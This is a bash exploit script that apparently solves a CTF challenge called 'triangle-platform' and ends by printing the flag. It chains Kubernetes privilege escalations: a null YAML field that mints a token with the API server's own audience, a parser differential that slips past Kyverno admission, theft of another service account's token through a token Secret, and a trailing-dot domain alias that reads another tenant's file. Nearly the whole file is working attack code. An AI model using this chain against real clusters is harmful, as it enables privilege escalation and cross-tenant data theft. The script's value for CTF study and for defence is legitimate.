#!/bin/bash
# NNS CTF - triangle-platform - full exploit chain
#
#   ./solve.sh https://triangle-platform-XXXX.chall.nnsc.tf
#
# Starts as system:serviceaccount:tenant-a:console (the token the frontend
# injects for un-authenticated /apis/... requests) and ends by printing the flag.
set -euo pipefail
B="${1:?usage: solve.sh <instance-url>}"
J='-H Content-Type:application/json'
api()   { curl -sk "$B$1" "${@:2}"; }                       # as console (frontend injects its token)
jq_get(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)"; }

echo "[*] target: $B"
api /apis/authentication.k8s.io/v1/selfsubjectreviews -XPOST $J \
    -d '{"kind":"SelfSubjectReview","apiVersion":"authentication.k8s.io/v1"}' \
    | jq_get 'd["status"]["userInfo"]["username"]'

########################################################################
# 1. token-exfil helper site + 2. tri-edge site (empty-audience token)
########################################################################
mksite() { # name  siteYAML
  api "/apis/triangle.io/v1/namespaces/tenant-a/sites" -XPOST $J \
      -d "$(NAME="$1" Y="$2" python3 -c 'import json,os;print(json.dumps({"apiVersion":"triangle.io/v1","kind":"Site","metadata":{"name":os.environ["NAME"]},"spec":{"siteYAML":os.environ["Y"]}}))')" \
      >/dev/null || true
}
read_file() { api "/api/v1/namespaces/tenant-a/services/$1:80/proxy/$2"; }

# --- vuln A: `target:` is null  ->  operator's Target.UnmarshalYAML is skipped
#            (yaml.v3 prepare() returns on a null node before the Unmarshaler,
#             d.null is a no-op for a struct) -> Plane stays platformDefaults()
#             value "control" -> planeAudiences["control"]=="" -> the projected
#             SA token is minted with the API server's OWN audience.
# --- vuln B: yaml.v3 (operator) never lets a `<<` merge overwrite an explicit
#            key; goyaml.v2 (Kyverno's sigs.k8s.io/yaml) applies `<<` positionally
#            and DOES overwrite an explicit key that came before it.
#              operator sees integrations:[edge]   -> ServiceAccount tri-edge
#              kyverno  sees integrations:[forms]   -> "on plan", admitted
EDGE_YAML=$'target: null\nintegrations:\n  - edge\n<<:\n  integrations:\n    - forms\nserver:\n  root: /var/run/triangle\n  index: token\n'
echo "[*] creating tri-edge site 'x1' ..."
mksite x1 "$EDGE_YAML"
sleep 6
EDGE=$(read_file x1 token)
python3 -c "import base64,json;p=json.loads(base64.urlsafe_b64decode('$EDGE'.split('.')[1]+'=='));print('[+] pod token: sub=%s aud=%s'%(p['sub'],p['aud']))"

########################################################################
# 3. tri-edge -> tri-registry-sync
#    tri-edge may create+get Secrets in triangle-system. Create a
#    kubernetes.io/service-account-token Secret for tri-registry-sync; the
#    TokenController fills in .data.token; read it back.
########################################################################
echo "[*] minting tri-registry-sync token via a token-Secret ..."
api /api/v1/namespaces/triangle-system/secrets -XPOST $J -H "Authorization: Bearer $EDGE" -d '{
 "apiVersion":"v1","kind":"Secret",
 "metadata":{"name":"rsync-tok","annotations":{"kubernetes.io/service-account.name":"tri-registry-sync"}},
 "type":"kubernetes.io/service-account-token"}' >/dev/null || true
RSYNC=""
for i in 1 2 3 4 5; do
  sleep 2
  RSYNC=$(api /api/v1/namespaces/triangle-system/secrets/rsync-tok -H "Authorization: Bearer $EDGE" \
          | python3 -c 'import sys,json,base64
try:
    t=json.load(sys.stdin)["data"]["token"]; print(base64.b64decode(t).decode())
except Exception: pass')
  [ -n "$RSYNC" ] && break
done
[ -n "$RSYNC" ] || { echo "!! token secret not populated"; exit 1; }
api /apis/authentication.k8s.io/v1/selfsubjectreviews -XPOST $J -H "Authorization: Bearer $RSYNC" \
    -d '{"kind":"SelfSubjectReview","apiVersion":"authentication.k8s.io/v1"}' \
    | jq_get '"[+] "+d["status"]["userInfo"]["username"]'

########################################################################
# 4. tri-registry-sync can CREATE Domains.
#    canonicalHost(h) = ToLower(TrimSuffix(h,".")) is only used by
#    syncOriginConfig (origin-<canonicalHost>) -- NOT by the bail / contested
#    checks, which compare spec.host raw. Domain CRD puts no pattern on host.
#    -> host "acme-invoices.sites.triangle.tld." (trailing dot):
#         * raw != tenant-b's Domain          -> claimZoneHost does not bail
#         * raw != any other host             -> not "contested" -> it is served
#         * canonicalHost == the flag host    -> syncOriginConfig reads
#                                                origin-acme-invoices.sites.triangle.tld
########################################################################
echo "[*] creating victim site 'pwn' (root=/var/run/origin index=FLAG) ..."
mksite pwn $'target: null\nserver:\n  root: /var/run/origin\n  index: FLAG\n'
echo "[*] creating aliased Domain as tri-registry-sync ..."
api /apis/triangle.io/v1/domains -XPOST $J -H "Authorization: Bearer $RSYNC" -d '{
 "apiVersion":"triangle.io/v1","kind":"Domain","metadata":{"name":"pwn-alias"},
 "spec":{"host":"acme-invoices.sites.triangle.tld.","siteRef":{"namespace":"tenant-a","name":"pwn"}}}' >/dev/null

# nudge the Site so the operator reconciles now that the Domain exists
RV=$(api /apis/triangle.io/v1/namespaces/tenant-a/sites/pwn | jq_get 'd["metadata"]["resourceVersion"]')
api /apis/triangle.io/v1/namespaces/tenant-a/sites/pwn -XPUT $J -d "{\"apiVersion\":\"triangle.io/v1\",\"kind\":\"Site\",\"metadata\":{\"name\":\"pwn\",\"resourceVersion\":\"$RV\"},\"spec\":{\"siteYAML\":\"target: null\\nserver:\\n  root: /var/run/origin\\n  index: FLAG\\n\"}}" >/dev/null
sleep 6

########################################################################
# 5. read it back through services/proxy + nginx
########################################################################
echo -n "[+] FLAG: "
read_file pwn FLAG; echo
